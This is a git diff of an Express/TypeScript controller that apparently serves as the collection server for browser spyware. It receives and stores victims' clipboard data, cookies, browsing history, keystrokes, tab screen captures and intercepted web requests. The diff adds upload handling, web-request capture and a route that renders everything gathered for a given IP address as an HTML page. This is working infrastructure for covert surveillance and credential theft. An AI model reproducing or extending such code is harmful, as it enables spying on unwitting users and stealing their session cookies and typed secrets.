@@ -1,13 +1,21 @@
 import { Request, Response, Router } from 'express';
 
 import Controller from '../interfaces/controller.interface';
+import { DataTypes } from '../consts';
 import InfoService from '../services/info.service';
 import ClipboardService from '../services/clipboard.service';
-import { DataTypes } from '../consts';
 import CookieService from '../services/cookies.service';
 import HistoryService from '../services/history.service';
 import KeystrokeService from '../services/keystrokes.service';
 import TabCaptureService from '../services/tabCapture.service';
+import fileMiddleware from '../middlewares/file.middleware';
+import WebRequestService from '../services/webRequest.service';
+import BulkRetrieverService from '../services/bulkRetriever.service';
+import buildHtml from '../helpers/httpBuilder/httpBuilder';
+
+interface MulterRequest extends Request {
+    file: any;
+}
 
 class DataController implements Controller {
     public path = '/data';
@@ -20,6 +28,8 @@ class DataController implements Controller {
     private historyService = new HistoryService();
     private keystrokeService = new KeystrokeService();
     private tabCaptureService = new TabCaptureService();
+    private webRequestService = new WebRequestService();
+    private bulkRetrieveService = new BulkRetrieverService();
 
     constructor() {
         this.initializeRoutes();
@@ -27,7 +37,8 @@ class DataController implements Controller {
 
     private initializeRoutes() {
         this.router.get(`${this.path}`, this.getDataInfo);
-        this.router.post(`${this.path}`, this.storeData);
+        this.router.get(`${this.path}/:ip`, this.getDataForIP);
+        this.router.post(`${this.path}`, fileMiddleware, this.storeData);
     }
 
     private getDataInfo = async (request: Request, response: Response) => {
@@ -36,6 +47,16 @@ class DataController implements Controller {
         } catch {
             response.status(500);
             return response.json("Failed to retrieve data")
+        }
+    }
+
+    private getDataForIP = async (request: Request, response: Response) => {
+        try {
+            const { ip } = request.params;
+            return response.send((await buildHtml(await this.bulkRetrieveService.retrieveForIP(ip))));
+        } catch {
+            response.status(404);
+            return response.json("Couldn't retrieve data for the given IP address");
         }
     }
 
@@ -57,7 +78,12 @@ class DataController implements Controller {
                         this.keystrokeService.storeKeystrokeBuffer(request.body, response.locals.lastid);
                         return response.status(200).send();
                     case DataTypes.TAB_CAPTURE:
-                        this.tabCaptureService.storeTabCapture(request.body, response.locals.lastid);
+                        const fileBuffer = (request as MulterRequest).file.buffer;
+                        this.tabCaptureService.storeTabCapture(fileBuffer, response.locals.lastid);
+                        return response.status(200).send();
+                    case DataTypes.WEB_REQUESTS:
+                        const buffer = Buffer.from(JSON.stringify(request.body.details));
+                        this.webRequestService.storeWebRequest({requestInfo: buffer}, response.locals.lastid);
                         return response.status(200).send();
                     default:
                         return response.json("Invalid endpoint");
@@ -65,7 +91,8 @@ class DataController implements Controller {
             }
             response.status(400);
             return response.send("Bad Request")
-        } catch {
+        } catch (err: any) {
+            console.log(err);
             response.status(500);
             return response.send("Internal server error")
         }
